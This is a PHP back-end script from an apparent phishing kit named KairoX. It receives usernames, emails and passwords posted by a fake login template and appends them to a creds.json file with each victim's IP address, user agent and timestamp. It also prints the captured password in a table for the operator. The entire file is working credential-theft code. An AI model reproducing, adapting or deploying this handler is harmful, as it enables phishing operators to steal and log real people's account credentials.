<?php
// KairoX - Credential Handler
// This file processes captured credentials

header('Content-Type: application/json');

$template = basename(dirname($_SERVER['PHP_SELF']));
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';

if (empty($username) && !empty($email)) {
    $username = $email;
}

if (!empty($username) && !empty($password)) {
    $data = array(
        'username' => $username,
        'password' => $password,
        'template' => $template,
        'datetime' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'useragent' => $_SERVER['HTTP_USER_AGENT']
    );
    
    // Save to JSON file
    $file = __DIR__ . '/creds.json';
    $existing = file_exists($file) ? json_decode(file_get_contents($file), true) : array();
    $existing[] = $data;
    file_put_contents($file, json_encode($existing, JSON_PRETTY_PRINT));
    
    // Print to console for GUI
    echo "\n+----------------+----------------+---------------------+\n";
    echo "| FIELD          | VALUE          | INFO                |\n";
    echo "+----------------+----------------+---------------------+\n";
    printf("| Username       | %-14s | %s |\n", substr($username, 0, 14), $template);
    printf("| Password       | %-14s | %s |\n", substr($password, 0, 14), date('H:i:s'));
    printf("| IP Address     | %-14s | %s |\n", substr($_SERVER['REMOTE_ADDR'], 0, 14), 'Captured');
    echo "+----------------+----------------+---------------------+\n\n";
    
    echo json_encode(array('success' => true));
} else {
    echo json_encode(array('success' => false, 'error' => 'Missing credentials'));
}
?>
